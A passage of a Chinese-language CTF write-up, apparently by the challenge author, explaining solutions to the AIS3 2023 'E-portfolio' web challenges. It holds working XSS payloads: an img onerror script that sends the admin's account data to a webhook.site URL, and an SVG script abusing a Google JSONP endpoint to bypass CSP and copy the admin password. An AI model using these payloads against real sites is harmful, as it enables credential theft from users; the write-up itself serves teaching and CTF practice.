class="string">[2 entries]</span></span><br><span class="line"><span class="string">+----+----------------+---------------------------------+----------+</span></span><br><span class="line"><span class="string">| id | code           | password                        | username |</span></span><br><span class="line"><span class="string">+----+----------------+---------------------------------+----------+</span></span><br><span class="line"><span class="string">| 1  | 47428350415632 | e1a5654762d385c8                | admin    |</span></span><br><span class="line"><span class="string">| 2  | 99999999999999 | guest                           | guest    |</span></span><br><span class="line"><span class="string">+----+----------------+---------------------------------+----------+</span></span><br></pre></td></tr></table></figure></div><p>這題最初是想做成只能用 boolean-based blind 挖資料庫，讓大家繞 reCAPTCHA 才能解的，不過我沒去擋 <code>row.password</code> 所以可以用簡單的方法解出。</p><h4 id="E-portfolio-baby"><a href="#E-portfolio-baby" class="headerlink" title="E-portfolio baby"></a>E-portfolio baby</h4><p><a class="link" href="https://github.com/Ching367436/My-CTF-Challenges/tree/main/ais3-pre-exam/2023/web/e-portfolio-baby">題目 source code <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><ul><li>解題人數<ul><li>MyFirstCTF: 0 / 111 (score &gt;= 100)</li><li>Pre-exam: 35 / 256 (score &gt;= 100)</li></ul></li></ul><p>題目 註冊 / 登入 後會來到 <code>Edit Portfolio</code> 的頁面，像下面這樣。</p><iframe frameBorder="0" style="overflow: visible; width: 100%; height: 35rem; " srcdoc="<html lang=&quot;en&quot;><head> <title>Edit Portfolio</title> <script async=&quot;&quot; src=&quot;https://www.clarity.ms/s/0.7.8/clarity.js&quot;></script><script async=&quot;&quot; src=&quot;https://www.clarity.ms/tag/gsfl4ftdey&quot;></script> <meta charset=&quot;UTF-8&quot;> <meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;> <meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;> <link href=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot; integrity=&quot;sha384-KK94CHFLLe+nY2dmCWGMq91rCGa5gtU4mk92HdvYe+M/SXH301p5ILy+dN9+nJOZ&quot; crossorigin=&quot;anonymous&quot;> <script src=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/js/bootstrap.bundle.min.js&quot; integrity=&quot;sha384-ENjdO4Dr2bkBIFxQpeoTz1HIcje39Wm4jDKdf19U8gI4ddQ3GYNS7NTKfAdVQSZe&quot; crossorigin=&quot;anonymous&quot;></script> <!-- Google tag (gtag.js) --> <script async=&quot;&quot; src=&quot;https://www.googletagmanager.com/gtag/js?id=G-2EDF3XCYWP&quot;></script> <script nonce=&quot;&quot;> window.dataLayer = window.dataLayer || []; function gtag() { dataLayer.push(arguments); } gtag(&quot;js&quot;, new Date()); gtag(&quot;config&quot;, &quot;G-2EDF3XCYWP&quot;); </script> <script type=&quot;text/javascript&quot; nonce=&quot;&quot;> (function (c, l, a, r, i, t, y) { c[a] = c[a] || function () { (c[a].q = c[a].q || []).push(arguments) }; t = l.createElement(r); t.async = 1; t.src = &quot;https://www.clarity.ms/tag/&quot; + i; y = l.getElementsByTagName(r)[0]; y.parentNode.insertBefore(t, y); })(window, document, &quot;clarity&quot;, &quot;script&quot;, &quot;gsfl4ftdey&quot;); </script> <style> body { background-color: #ffed4a; } </style></head> <body> <div class=&quot;container-sm mt-5&quot;> <h1 class=&quot;mb-3&quot;>Edit Portfolio</h1> <div class=&quot;row mb-5&quot;> <div class=&quot;col-sm-3&quot;> <h3 class=&quot;mb-3 mt-3&quot;>Photo</h3> <img src=&quot;/images/Ching367436.jpg&quot; class=&quot;img-fluid&quot; id=&quot;avatar&quot; style=&quot;width: 15rem;&quot;> <div class=&quot;mt-3 mb-3&quot;> <label class=&quot;form-label&quot; for=&quot;avatarFile&quot;>Upload avatar</label> <input type=&quot;file&quot; class=&quot;form-control&quot; id=&quot;avatarFile&quot;> </div> </div> <div class=&quot;col-sm-9&quot;> <h3 class=&quot;mt-3&quot;>About <span id=&quot;username&quot;>Ching367436</span></h3> <textarea name=&quot;&quot; id=&quot;about&quot; class=&quot;form-control&quot; rows=&quot;10&quot;><h5>Hello!</h5>I am a <span style=&quot;color: red;&quot;>new</span> user.</textarea> </div> </div> <div class=&quot;container&quot;> <button type=&quot;submit&quot; class=&quot;btn btn-primary mb-2&quot; id=&quot;save&quot;>Save</button> <button type=&quot;submit&quot; class=&quot;btn btn-primary mb-2&quot; id=&quot;logout&quot;>Logout</button> <button type=&quot;submit&quot; class=&quot;btn btn-primary mb-2&quot; id=&quot;share&quot;>Share</button> <button type=&quot;submit&quot; class=&quot;btn btn-primary mb-2&quot; id=&quot;report&quot;>Share your portfolio with admin</button> <div class=&quot;g-recaptcha&quot; data-sitekey=&quot;6LeIxAcTAAAAAJcZVRqyHh71UMIEGNQ_MXjiZKhI&quot; data-callback=&quot;onReport&quot; data-size=&quot;invisible&quot;></div></div></body></html>"></iframe><p>按下 Share 後可以看到輸入的 portfolio 的 HTML 被 render 出來了。而這個頁面正是按下 Share your portfolio with admin 後，admin 會拜訪的頁面，要透過這個頁面的 XSS 偷走 admin 的密碼。</p><iframe frameBorder="0" style="overflow: visible; width: 100%; height: 35rem; " srcdoc="<html lang=&quot;en&quot;><head> <title>Share</title> <meta charset=&quot;UTF-8&quot;> <meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;> <meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;> <link href=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot; integrity=&quot;sha384-KK94CHFLLe+nY2dmCWGMq91rCGa5gtU4mk92HdvYe+M/SXH301p5ILy+dN9+nJOZ&quot; crossorigin=&quot;anonymous&quot;> <script async=&quot;&quot; src=&quot;https://www.clarity.ms/tag/gsfl4ftdey&quot;></script><script src=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/js/bootstrap.bundle.min.js&quot; integrity=&quot;sha384-ENjdO4Dr2bkBIFxQpeoTz1HIcje39Wm4jDKdf19U8gI4ddQ3GYNS7NTKfAdVQSZe&quot; crossorigin=&quot;anonymous&quot;></script> <!-- Google tag (gtag.js) --> <script async=&quot;&quot; src=&quot;https://www.googletagmanager.com/gtag/js?id=G-2EDF3XCYWP&quot;></script> <script nonce=&quot;&quot;> window.dataLayer = window.dataLayer || []; function gtag() { dataLayer.push(arguments); } gtag(&quot;js&quot;, new Date()); gtag(&quot;config&quot;, &quot;G-2EDF3XCYWP&quot;); </script> <script type=&quot;text/javascript&quot; nonce=&quot;&quot;> (function (c, l, a, r, i, t, y) { c[a] = c[a] || function () { (c[a].q = c[a].q || []).push(arguments) }; t = l.createElement(r); t.async = 1; t.src = &quot;https://www.clarity.ms/tag/&quot; + i; y = l.getElementsByTagName(r)[0]; y.parentNode.insertBefore(t, y); })(window, document, &quot;clarity&quot;, &quot;script&quot;, &quot;gsfl4ftdey&quot;); </script> <style> body { background-color: #ffed4a; } </style></head> <body> <div class=&quot;container mt-5&quot;> <h1 class=&quot;mb-3&quot;>Edit Portfolio</h1> <div class=&quot;row mb-5&quot;> <div class=&quot;col-sm-3&quot;> <h3 class=&quot;mb-3 mt-3&quot;>Photo</h3> <img src=&quot;/images/Ching367436.jpg&quot; class=&quot;img-fluid&quot; id=&quot;avatar&quot; style=&quot;width: 15rem;&quot;> </div> <div class=&quot;col-sm-9&quot;> <h3 class=&quot;mb-3 mt-3&quot;>About <span id=&quot;username&quot;>Ching367436</span></h3> <div id=&quot;about&quot;><h5>Hello!</h5> I am a <span style=&quot;color: red;&quot;>new</span> user.</div> </div> </div> </div></body></html>"></iframe><p><a class="link" href="https://github.com/Ching367436/My-CTF-Challenges/blob/main/ais3-pre-exam/2023/web/e-portfolio-baby/web/src/views/share.eta#L30">source code <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 裡，也就是下面的第 7 行用了 <code>innerHTML</code>，而 <code>data.data.about</code> 也是我們可完全控制的，所以表示我們能 XSS。</p><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">nonce</span>=<span class="string">"&lt;%= it.nonce %&gt;"</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">fetch</span>(<span class="string">`/api/share<span class="subst">${location.search}</span>`</span>)</span></span><br><span class="line"><span class="language-javascript">        .<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> res.<span class="title function_">json</span>())</span></span><br><span class="line"><span class="language-javascript">        .<span class="title function_">then</span>(<span class="function"><span class="params">data</span> =&gt;</span> {</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">if</span> (data.<span class="property">success</span>) {</span></span><br><span class="line"><span class="language-javascript">                username.<span class="property">innerHTML</span> = data.<span class="property">data</span>.<span class="property">username</span></span></span><br><span class="line"><span class="language-javascript">                about.<span class="property">innerHTML</span> = data.<span class="property">data</span>.<span class="property">about</span></span></span><br><span class="line"><span class="language-javascript">                avatar.<span class="property">src</span> = data.<span class="property">data</span>.<span class="property">avatar</span></span></span><br><span class="line"><span class="language-javascript">            } <span class="keyword">else</span> {</span></span><br><span class="line"><span class="language-javascript">                <span class="title function_">alert</span>(data.<span class="property">message</span>)</span></span><br><span class="line"><span class="language-javascript">            }</span></span><br><span class="line"><span class="language-javascript">        })</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p>有 XSS 後還需要找到能偷 密碼 的地方，剛好 <a href="https://github.com/Ching367436/My-CTF-Challenges/blob/main/ais3-pre-exam/2023/web/e-portfolio-baby/web/src/app.js#L120-L130"><code>/api/portfolio</code></a> 可以拿到使用者的密碼，因為他用了 <code>SELECT *</code>，這個送密碼到前端是 Copilot 寫的洞，如果我沒注意到這題就會變成超級水題。</p><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">get</span>(<span class="string">"/api/portfolio"</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> {</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">username</span>)</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">401</span>).<span class="title function_">json</span>({ <span class="attr">success</span>: <span class="literal">false</span>, <span class="attr">message</span>: <span class="string">"Unauthorized"</span> })</span><br><span class="line">    db.<span class="title function_">get</span>(<span class="string">"SELECT * FROM Users WHERE username = ?"</span>, req.<span class="property">session</span>.<span class="property">username</span>, <span class="function">(<span class="params">err, row</span>) =&gt;</span> {</span><br><span class="line">        <span class="keyword">if</span> (err)</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">json</span>({ <span class="attr">success</span>: <span class="literal">false</span>, <span class="attr">message</span>: <span class="string">"Internal server error"</span> })</span><br><span class="line">        <span class="keyword">if</span> (!row)</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">404</span>).<span class="title function_">json</span>({ <span class="attr">success</span>: <span class="literal">false</span>, <span class="attr">message</span>: <span class="string">"Not found"</span> })</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">json</span>({ <span class="attr">success</span>: <span class="literal">true</span>, <span class="attr">data</span>: row })</span><br><span class="line">    })</span><br><span class="line">})</span><br></pre></td></tr></table></figure></div><p>這裡我們使用下方的 code 設成我們的 portfolio 來觸發 XSS，注意因為這個 XSS 的點是 <code>innerHTML</code>，所以直接插入 <code>&lt;script&gt;</code> 是不會被執行的，這裡有說明為什麼不行 <a class="link" href="https://developer.mozilla.org/en-US/docs/Web/API/Element/innerHTML#security_considerations%E3%80%82">https://developer.mozilla.org/en-US/docs/Web/API/Element/innerHTML#security_considerations。 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p>下面的 script 做的是就是把使用者的資料送到 webhook.site，儲存後按下 Share your portfolio with admin，admin 拜訪後他的資料就會被送來我們這邊，flag 就在裡面，結果在下面那張圖片裡。也有另一種送資料的方式：把資料設成自己的 portfolio。</p><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">"</span></span></span><br><span class="line"><span class="string"><span class="tag">    fetch('/api/portfolio')</span></span></span><br><span class="line"><span class="string"><span class="tag">        .then(function (res) { return res.json() })</span></span></span><br><span class="line"><span class="string"><span class="tag">            .then(function (data) {</span></span></span><br><span class="line"><span class="string"><span class="tag">                location = `https://webhook.site/e4d998ee-e522-4327-a277-9fa10b77e43a?${JSON.stringify(data)}`</span></span></span><br><span class="line"><span class="string"><span class="tag">            });</span></span></span><br><span class="line"><span class="string"><span class="tag">"</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p><img src="/ais3-pre-exam-2023-write-up/webhook.png"></p><p>另外看到有一些人選擇偷 cookie，但 <code>connect.sid</code> 是設成了 http only，所以 Javascript 在一般情況下是拿不到這個跟登入狀態有關的 cookie 的。</p><p>另外在 MyFirstCTF 結束後我有上台分享大家都在 portfolio 裡面放了什麼，那份簡報在<a href="/ais3-pre-exam-2023-write-up/My%20First%20CTF%202023.pdf">這裡</a>。</p><p>另外這題 admin 的使用者名稱不叫作 admin，所以會看到有人會把 admin 註冊起來然後放假的 flag，很多人中計。</p><h4 id="E-portfolio"><a href="#E-portfolio" class="headerlink" title="E-portfolio"></a>E-portfolio</h4><p><a class="link" href="https://github.com/Ching367436/My-CTF-Challenges/tree/main/ais3-pre-exam/2023/web/e-portfolio">題目 source code <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><ul><li>解題人數<ul><li>Pre-exam: 2 / 256 (score &gt;= 100)</li></ul></li></ul><p>其實原本沒有 E-Portfolio baby 這題，是 MyFirstCTF 題不夠才把 E-portfolio 簡化成新的一題。</p><p>這題跟 E-Portfolio baby 的差別只有多了 <a class="link" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP">CSP <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 跟 <a class="link" href="https://github.com/cure53/DOMPurify">DOMPurify <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 的防護而已。</p><p>前一題的<a href="https://github.com/Ching367436/My-CTF-Challenges/blob/main/ais3-pre-exam/2023/web/e-portfolio/web/src/views/share.eta#L29-L30">所有 <code>innerHTML</code> 的地方</a> 都被加上了 <code>DOMPurify.sanitize</code>，所以這些地方就很難 XSS 了，不過我們還有可以上傳圖片的地方，可以試試 SVG XSS。</p><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">nonce</span>=<span class="string">"&lt;%= it.nonce %&gt;"</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">fetch</span>(<span class="string">`/api/share<span class="subst">${location.search}</span>`</span>)</span></span><br><span class="line"><span class="language-javascript">        .<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> res.<span class="title function_">json</span>())</span></span><br><span class="line"><span class="language-javascript">        .<span class="title function_">then</span>(<span class="function"><span class="params">data</span> =&gt;</span> {</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">if</span> (data.<span class="property">success</span>) {</span></span><br><span class="line"><span class="language-javascript">                username.<span class="property">innerHTML</span> = <span class="title class_">DOMPurify</span>.<span class="title function_">sanitize</span>(data.<span class="property">data</span>.<span class="property">username</span>)</span></span><br><span class="line"><span class="language-javascript">                about.<span class="property">innerHTML</span> = <span class="title class_">DOMPurify</span>.<span class="title function_">sanitize</span>(data.<span class="property">data</span>.<span class="property">about</span>)</span></span><br><span class="line"><span class="language-javascript">                avatar.<span class="property">src</span> = data.<span class="property">data</span>.<span class="property">avatar</span></span></span><br><span class="line"><span class="language-javascript">            } <span class="keyword">else</span> {</span></span><br><span class="line"><span class="language-javascript">                <span class="title function_">alert</span>(data.<span class="property">message</span>)</span></span><br><span class="line"><span class="language-javascript">            }</span></span><br><span class="line"><span class="language-javascript">        })</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p>使用者上傳圖片之後會被 host 到 <code>/avatars/&lt;MD5 hash&gt;.&lt;ext&gt;</code>，所以確實可以 SVG XSS。</p><p>要 XSS 之前我們還需要 bypass <a class="link" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP">CSP <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。把<a class="link" href="https://github.com/Ching367436/My-CTF-Challenges/blob/main/ais3-pre-exam/2023/web/e-portfolio/web/src/app.js#L43-L63">網站設置的 CSP <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 拿到 <a class="link" href="https://csp-evaluator.withgoogle.com/">CSP Evaluator <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 看看有哪些地方可以用來 XSS，發現 <code>'script-src'</code> 有 <code>https://*.google.com</code> 可以利用。</p><p><img src="/ais3-pre-exam-2023-write-up/csp-evaluator.png"></p><p>可以使用下面這個 endpoint，把 XSS payload 放到 <code>?callback</code> 裡就能用了，那個網址的回應如下二所示，可看到我們的 <code>fetch('/api/portfolio');</code> 被放進回應裡，而且是個可正常執行的 Javascript。</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://accounts.google.com/o/oauth2/revoke?callback=fetch(%27/api/portfolio%27);</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// API callback</span></span><br><span class="line"><span class="title function_">fetch</span>(<span class="string">'/api/portfolio'</span>);({</span><br><span class="line">  <span class="string">"error"</span>: {</span><br><span class="line">    <span class="string">"code"</span>: <span class="number">400</span>,</span><br><span class="line">    <span class="string">"message"</span>: <span class="string">"Invalid JSONP callback name: 'fetch('/api/portfolio');'; only alphabet, number, '_', '$', '.', '[' and ']' are allowed."</span>,</span><br><span class="line">    <span class="string">"status"</span>: <span class="string">"INVALID_ARGUMENT"</span></span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line">);</span><br></pre></td></tr></table></figure></div><p>所以解題步驟如下：</p><ol><li>把下面這個 SVG 設成自己的 avatar，他做的事情就是把使用者密碼存到自己的 portfolio 裡面。</li></ol><div class="highlight-container" data-rel="Svg"><figure class="iseeu highlight svg"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">xmlns</span>=<span class="string">"http://www.w3.org/2000/svg"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">href</span>=<span class="string">"https://accounts.google.com/o/oauth2/revoke?callback=fetch('/api/portfolio')</span></span></span><br><span class="line"><span class="string"><span class="tag">                .then(function (res) { return res.json() })</span></span></span><br><span class="line"><span class="string"><span class="tag">                .then(function (data) {</span></span></span><br><span class="line"><span class="string"><span class="tag">                    if (data.success) {</span></span></span><br><span class="line"><span class="string"><span class="tag">                        const ADMIN_PASSWORD = data.data.password;</span></span></span><br><span class="line"><span class="string"><span class="tag">                        fetch('/api/login', {</span></span></span><br><span class="line"><span class="string"><span class="tag">                            method: 'POST',</span></span></span><br><span class="line"><span class="string"><span class="tag">                            headers: {</span></span></span><br><span class="line"><span class="string"><span class="tag">                                'Content-Type': 'application/json'</span></span></span><br><span class="line"><span class="string"><span class="tag">                            },</span></span></span><br><span class="line"><span class="string"><span class="tag">                            body: JSON.stringify({</span></span></span><br><span class="line"><span class="string"><span class="tag">                                username: 'c9dec36a35e1f8723cdcbbbad50123f3',</span></span></span><br><span class="line"><span class="string"><span class="tag">                                password: 'f7e2ca2336d33b6509656bb3581f0fa0' </span></span></span><br><span class="line"><span class="string"><span class="tag">                            })</span></span></span><br><span class="line"><span class="string"><span class="tag">                        })</span></span></span><br><span class="line"><span class="string"><span class="tag">                        .then(function (res) { </span></span></span><br><span class="line"><span class="string"><span class="tag">                            const formData = new FormData();</span></span></span><br><span class="line"><span class="string"><span class="tag">                            formData.append('about', ADMIN_PASSWORD);</span></span></span><br><span class="line"><span class="string"><span class="tag">                            fetch('/api/portfolio', {</span></span></span><br><span class="line"><span class="string"><span class="tag">                                method: 'PUT',</span></span></span><br><span class="line"><span class="string"><span class="tag">                                body: formData</span></span></span><br><span class="line"><span class="string"><span class="tag">                            })</span></span></span><br><span class="line"><span class="string"><span class="tag">                        })</span></span></span><br><span class="line"><span class="string"><span class="tag">                    } </span></span></span><br><span class="line"><span class="string"><span class="tag">                });"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure></div><ol start="2"><li><p>把剛上傳好的 <code>/avatars/&lt;MD5 hash&gt;.svg</code> 網址記下來，如果直接拜訪 <code>/avatars/&lt;MD5 hash&gt;.svg</code> 可以確認 XSS 確實被觸發。</p><p>所以要把 <code>/avatars/&lt;MD5 hash&gt;.svg</code> 送給 admin，需要蓋過<a class="link" href="https://github.com/Ching367436/My-CTF-Challenges/blob/main/ais3-pre-exam/2023/web/e-portfolio/web/src/views/portfolio.eta#L86C9-L103">原本 Share your portfolio with admin 的網址 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，其實只需把 <code>onReport</code> 蓋成送我們的 <code>/avatars/&lt;MD5 hash&gt;.svg</code> 的網址，像下面這樣。（之所以是蓋 <code>onReport</code> 的原因是因為 reCAPTCHA 的<a class="link" href="https://github.com/Ching367436/My-CTF-Challenges/blob/main/ais3-pre-exam/2023/web/e-portfolio/web/src/views/portfolio.eta#L35-L36">配置 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>關係）。</p><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">onReport</span>(<span class="params">token</span>) {</span><br><span class="line">    <span class="keyword">const</span> url = <span class="keyword">new</span> <span class="title function_">URL</span>(<span class="string">`/avatars/8209116d30ade81ae5c2793d3d8ed4cf.svg`</span>, location)</span><br><span class="line">    <span class="title function_">fetch</span>(<span class="string">'/api/report'</span>, {</span><br><span class="line">        <span class="attr">method</span>: <span class="string">'POST'</span>,</span><br><span class="line">        <span class="attr">headers</span>: {</span><br><span class="line">            <span class="string">'Content-Type'</span>: <span class="string">'application/json'</span></span><br><span class="line">        },</span><br><span class="line">        <span class="attr">body</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>({ <span class="attr">url</span>: url.<span class="property">href</span>, <span class="string">'g-recaptcha-response'</span>: token }),</span><br><span class="line">    })</span><br><span class="line">        .<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> res.<span class="title function_">json</span>())</span><br><span class="line">        .<span class="title function_">then</span>(<span class="function"><span class="params">data</span> =&gt;</span> {</span><br><span class="line">            <span class="keyword">if</span> (data.<span class="property">success</span>)</span><br><span class="line">                <span class="title function_">alert</span>(<span class="string">'Request sent!'</span>)</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="title function_">alert</span>(data.<span class="property">message</span>)</span><br><span class="line">            grecaptcha.<span class="title function_">reset</span>();</span><br><span class="line">        })</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div></li><li><p>登入我們剛剛用來收資料的帳戶可以看到 portfolio 已經被設成 flag 了。</p></li></ol><iframe frameBorder="0" style="overflow: visible; width: 100%; height: 35rem; " srcdoc="<html lang=&quot;en&quot;> <head> <title>Edit Portfolio</title> <script async=&quot;&quot; src=&quot;https://www.clarity.ms/tag/gsfl4ftdey&quot;></script> <meta charset=&quot;UTF-8&quot;> <meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;> <meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;> <link href=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot; integrity=&quot;sha384-KK94CHFLLe+nY2dmCWGMq91rCGa5gtU4mk92HdvYe+M/SXH301p5ILy+dN9+nJOZ&quot; crossorigin=&quot;anonymous&quot;> <script src=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/js/bootstrap.bundle.min.js&quot; integrity=&quot;sha384-ENjdO4Dr2bkBIFxQpeoTz1HIcje39Wm4jDKdf19U8gI4ddQ3GYNS7NTKfAdVQSZe&quot; crossorigin=&quot;anonymous&quot;></script> <!-- Google tag (gtag.js) --> <script async=&quot;&quot; src=&quot;https://www.googletagmanager.com/gtag/js?id=G-2EDF3XCYWP&quot;></script> <script nonce=&quot;&quot;> window.dataLayer = window.dataLayer || []; function gtag() { dataLayer.push(arguments); } gtag(&quot;js&quot;, new Date()); gtag(&quot;config&quot;, &quot;G-2EDF3XCYWP&quot;); </script> <script type=&quot;text/javascript&quot; nonce=&quot;&quot;> (function (c, l, a, r, i, t, y) { c[a] = c[a] || function () { (c[a].q = c[a].q || []).push(arguments) }; t = l.createElement(r); t.async = 1; t.src = &quot;https://www.clarity.ms/tag/&quot; + i; y = l.getElementsByTagName(r)[0]; y.parentNode.insertBefore(t, y); })(window, document, &quot;clarity&quot;, &quot;script&quot;, &quot;gsfl4ftdey&quot;); </script> </head> <body> <div class=&quot;container-sm mt-5&quot;> <h1 class=&quot;mb-3&quot;>Edit Portfolio</h1> <div class=&quot;row mb-5&quot;> <div class=&quot;col-sm-3&quot;> <h3 class=&quot;mb-3 mt-3&quot;>Photo</h3> <img src=&quot;/images/Ching367436.jpg&quot; class=&quot;img-fluid&quot; id=&quot;avatar&quot; style=&quot;width: 15rem;&quot;> <div class=&quot;mt-3 mb-3&quot;> <label class=&quot;form-label&quot; for=&quot;avatarFile&quot;>Upload avatar</label> <input type=&quot;file&quot; class=&quot;form-control&quot; id=&quot;avatarFile&quot;> </div> </div> <div class=&quot;col-sm-9&quot;> <h3 class=&quot;mt-3&quot;>About <span id=&quot;username&quot;>c9dec36a35e1f8723cdcbbbad50123f3</span></h3> <textarea name=&quot;&quot; id=&quot;about&quot; class=&quot;form-control&quot; rows=&quot;10&quot;>AIS3{<script href=&quot;https://accounts.google.com/o/oauth2/revoke?callback=fetch('/api/portfolio');&quot;></script>}</textarea> </div> </div> <div class=&quot;container&quot;> <button type=&quot;submit&quot; class=&quot;btn btn-primary mb-2&quot; id=&quot;save&quot;>Save</button> <button type=&quot;submit&quot; class=&quot;btn btn-primary mb-2&quot; id=&quot;logout&quot;>Logout</button> <button type=&quot;submit&quot; class=&quot;btn btn-primary mb-2&quot; id=&quot;share&quot;>Share</button> <button type=&quot;submit&quot; class=&quot;btn btn-primary mb-2&quot; id=&quot;report&quot;>Share your portfolio with admin</button> </div> </div> </body> </html>"></iframe>]]></content>
    
    
